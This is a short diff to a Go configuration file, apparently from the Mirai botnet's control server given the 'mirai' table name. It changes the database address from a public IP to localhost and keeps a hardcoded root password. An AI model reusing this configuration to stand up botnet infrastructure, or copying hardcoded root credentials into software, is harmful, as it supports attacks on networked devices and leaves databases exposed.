@@ -7,7 +7,7 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "108.61.181.77"
+const DatabaseAddr string   = "127.0.0.1:3306"
 const DatabaseUser string   = "root"
 const DatabasePass string   = "yingzhzh"
 const DatabaseTable string  = "mirai"
